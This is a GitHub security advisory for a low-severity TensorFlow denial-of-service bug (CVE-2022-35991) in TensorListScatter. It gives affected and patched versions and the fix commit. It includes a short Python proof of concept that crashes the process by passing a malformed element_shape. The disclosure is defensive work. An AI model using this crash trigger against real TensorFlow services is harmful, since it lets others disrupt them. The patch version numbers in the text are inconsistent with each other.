# `CHECK` fail in `TensorListScatter` and `TensorListScatterV2`

Low

[pak-laura](/pak-laura)
published
GHSA-vm7x-4qhj-rrcq
Sep 15, 2022

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.10.0

## Patched versions

2.7.4, 2.8.3, 2.9.2, 2.10.0

## Description

### Impact

When `TensorListScatter` and `TensorListScatterV2` receive an `element_shape` of a rank greater than one, they give a `CHECK` fail that can trigger a denial of service attack.

```
import tensorflow as tf
arg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)
arg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_3=''
tf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1,
element_shape=arg_2, name=arg_3)
```
### Patches

We have patched the issue in GitHub commit [bb03fdf4aae944ab2e4b35c7daa051068a8b7f61](https://github.com/tensorflow/tensorflow/commit/bb03fdf4aae944ab2e4b35c7daa051068a8b7f61).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution

This vulnerability has been reported by 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology.

### Severity

### CVE ID

CVE-2022-35991
